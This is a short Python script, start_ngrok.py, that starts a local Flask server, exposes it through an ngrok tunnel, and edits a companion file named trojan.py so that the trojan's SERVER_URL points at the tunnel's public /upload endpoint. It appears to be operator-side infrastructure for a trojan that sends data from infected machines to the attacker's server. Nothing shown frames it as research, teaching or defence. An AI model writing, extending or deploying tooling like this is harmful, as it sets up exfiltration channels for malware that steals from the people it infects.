# start_ngrok.py
from pyngrok import ngrok
import subprocess
import time
import webbrowser

# Start Flask server
print("[*] Starting Flask server...")
server = subprocess.Popen(["python", "server.py"])

# Wait for server to start
time.sleep(3)

# Start ngrok tunnel
print("[*] Starting ngrok tunnel...")
public_url = ngrok.connect(5000).public_url
print(f"[✓] Ngrok URL: {public_url}")

# Update trojan configuration
print("[*] Updating trojan configuration...")
with open("trojan.py", "r") as f:
    content = f.read()

# Update the server URL in trojan.py
new_content = content.replace(
    'SERVER_URL = "https://your-server.ngrok-free.dev/upload"',
    f'SERVER_URL = "{public_url}/upload"'
)

with open("trojan.py", "w") as f:
    f.write(new_content)

print(f"[✓] Trojan updated to use: {public_url}/upload")
print("\n[*] You can now:")
print(f"    1. Access server locally: http://localhost:5000")
print(f"    2. Access server remotely: {public_url}")
print("\n[*] Press Ctrl+C to stop everything")

# Open browser
webbrowser.open(public_url)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Shutting down...")
    server.terminate()
    ngrok.kill()